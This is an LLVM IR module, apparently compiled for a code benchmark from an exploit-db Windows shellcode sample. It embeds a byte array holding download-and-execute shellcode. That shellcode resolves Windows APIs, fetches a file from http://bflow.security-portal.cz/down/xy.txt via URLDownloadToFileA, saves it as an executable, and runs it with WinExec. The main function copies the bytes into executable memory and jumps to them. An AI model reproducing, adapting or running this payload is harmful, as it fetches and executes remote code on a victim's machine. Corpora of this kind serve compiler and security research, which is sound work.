; ModuleID = '/home/carl/AnghaBench/exploitdb/shellcodes/windows/extr_24318.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/shellcodes/windows/extr_24318.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shellcode = private unnamed_addr constant [317 x i8] c"3\C9d\8BA0\8B@\0C\8Bp\14\AD\96\AD\8BX\10\8BS<\03\D3\8BRx\03\D3\8Br \03\F33\C9A\AD\03\C3\818GetPu\F4\81x\04rocAu\EB\81x\08ddreu\E2\8Br$\03\F3f\8B\0CNI\8Br\1C\03\F3\8B\14\8E\03\D33\C9Qh.exehdeadSRQharyAhLibrhLoadTS\FF\D2\83\C4\0CYPQf\B9llQhon.dhurlmT\FF\D0\83\C4\10\8BT$\043\C9Qf\B9eAQ3\C9hoFilhoadThownlhURLDTP\FF\D23\C9\8DT$$QQR\EBGQ\FF\D0\83\C4\1C3\C9Z[SRQhxeca\88L$\03hWinETS\FF\D2j\05\8DL$\18Q\FF\D0\83\C4\0CZ[hessa\83l$\03ahProchExitTS\FF\D2\FF\D0\E8\B4\FF\FF\FFhttp://bflow.security-portal.cz/down/xy.txt\00\00", align 16
@MEM_COMMIT = common dso_local global i32 0, align 4
@PAGE_EXECUTE_READWRITE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"Memory isn't allocated!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [317 x i8], align 16
  %3 = alloca i32*, align 8
  %4 = alloca void (...)*, align 8
  store i32 0, i32* %1, align 4
  %5 = bitcast [317 x i8]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %5, i8* align 16 getelementptr inbounds ([317 x i8], [317 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 317, i1 false)
  store i32* null, i32** %3, align 8
  %6 = load i32, i32* @MEM_COMMIT, align 4
  %7 = load i32, i32* @PAGE_EXECUTE_READWRITE, align 4
  %8 = call i32* @VirtualAlloc(i32 0, i32 4096, i32 %6, i32 %7)
  store i32* %8, i32** %3, align 8
  %9 = load i32*, i32** %3, align 8
  %10 = icmp eq i32* %9, null
  br i1 %10, label %11, label %13

11:                                               ; preds = %0
  %12 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %24

13:                                               ; preds = %0
  %14 = load i32*, i32** %3, align 8
  %15 = getelementptr inbounds [317 x i8], [317 x i8]* %2, i64 0, i64 0
  %16 = getelementptr inbounds [317 x i8], [317 x i8]* %2, i64 0, i64 0
  %17 = ptrtoint i8* %16 to i32
  %18 = call i64 @lstrlenA(i32 %17)
  %19 = add nsw i64 %18, 1
  %20 = call i32 @memcpy(i32* %14, i8* %15, i64 %19)
  %21 = load i32*, i32** %3, align 8
  %22 = bitcast i32* %21 to void (...)*
  store void (...)* %22, void (...)** %4, align 8
  %23 = load void (...)*, void (...)** %4, align 8
  call void (...) %23()
  store i32 0, i32* %1, align 4
  br label %24

24:                                               ; preds = %13, %11
  %25 = load i32, i32* %1, align 4
  ret i32 %25
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32* @VirtualAlloc(i32, i32, i32, i32) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @memcpy(i32*, i8*, i64) #2

declare dso_local i64 @lstrlenA(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
